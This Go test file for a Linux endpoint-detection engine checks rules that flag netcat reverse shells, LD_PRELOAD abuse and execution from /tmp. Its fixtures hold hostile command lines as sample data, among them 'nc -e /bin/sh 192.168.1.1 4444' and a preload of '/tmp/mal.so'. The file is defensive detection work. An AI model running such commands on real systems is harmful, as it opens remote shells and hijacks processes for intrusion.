package detection

import (
	"testing"
	"time"

	"edr-linux/pkg/events"
)

func TestEval_NetcatRule(t *testing.T) {
	eng := NewEngine()
	eng.AddRule(Rule{
		ID:       "proc-lnx-netcat-revshell",
		Name:     "Suspicious Netcat Reverse Shell",
		Severity: "high",
		Cond: Condition{
			Op: "or",
			Children: []Condition{
				{
					Op: "and",
					Children: []Condition{
						{Field: "process.command_line", Op: "contains", Value: " -e "},
						{Field: "process.executable", Op: "endswith", Value: "/nc"},
					},
				},
			},
		},
	})

	// Should match: nc -e /bin/sh
	norm := &events.NormalizedEvent{
		EventType: "execve",
		Process: events.ProcessInfo{
			Executable:  "/usr/bin/nc",
			CommandLine: "nc -e /bin/sh 192.168.1.1 4444",
		},
	}
	matched := eng.Eval(norm)
	if len(matched) != 1 {
		t.Fatalf("expected 1 match, got %d", len(matched))
	}
	if matched[0].ID != "proc-lnx-netcat-revshell" {
		t.Errorf("wrong rule matched: %s", matched[0].ID)
	}

	// Should NOT match: normal nc
	norm2 := &events.NormalizedEvent{
		EventType: "execve",
		Process: events.ProcessInfo{
			Executable:  "/usr/bin/nc",
			CommandLine: "nc -l -p 4444",
		},
	}
	matched2 := eng.Eval(norm2)
	if len(matched2) != 0 {
		t.Errorf("expected 0 match for normal nc, got %d", len(matched2))
	}
}

func TestEval_LDPreloadRule(t *testing.T) {
	eng := NewEngine()
	eng.AddRule(Rule{
		ID:       "proc-lnx-ld-preload",
		Name:     "LD_PRELOAD Abuse",
		Severity: "high",
		Cond: Condition{
			Op: "or",
			Children: []Condition{
				{Field: "process.command_line", Op: "contains", Value: "LD_PRELOAD"},
			},
		},
	})

	norm := &events.NormalizedEvent{
		EventType: "execve",
		Process: events.ProcessInfo{
			Executable:  "/usr/bin/bash",
			CommandLine: "LD_PRELOAD=/tmp/mal.so /bin/ls",
		},
	}
	matched := eng.Eval(norm)
	if len(matched) != 1 {
		t.Fatalf("expected 1 match, got %d", len(matched))
	}
}

func TestEval_TmpExecRule(t *testing.T) {
	eng := NewEngine()
	eng.AddRule(Rule{
		ID:       "proc-lnx-tmp-exec",
		Name:     "Execution from /tmp",
		Severity: "high",
		Cond: Condition{
			Op: "or",
			Children: []Condition{
				{Field: "process.executable", Op: "startswith", Value: "/tmp/"},
			},
		},
	})

	norm := &events.NormalizedEvent{
		EventType: "execve",
		Process: events.ProcessInfo{
			Executable:  "/tmp/malicious",
			CommandLine: "/tmp/malicious",
		},
	}
	matched := eng.Eval(norm)
	if len(matched) != 1 {
		t.Fatalf("expected 1 match, got %d", len(matched))
	}
}

func TestNormToMap(t *testing.T) {
	norm := &events.NormalizedEvent{
		Timestamp: time.Now(),
		EventType: "execve",
		Process: events.ProcessInfo{
			Executable:  "/usr/bin/nc",
			CommandLine: "nc -e /bin/sh",
		},
	}
	m := normToMap(norm)
	if m == nil {
		t.Fatal("normToMap returned nil")
	}
	proc, ok := m["process"].(map[string]interface{})
	if !ok {
		t.Fatalf("process not a map: %T", m["process"])
	}
	if proc["executable"] != "/usr/bin/nc" {
		t.Errorf("executable = %v", proc["executable"])
	}
	if proc["command_line"] != "nc -e /bin/sh" {
		t.Errorf("command_line = %v", proc["command_line"])
	}
}
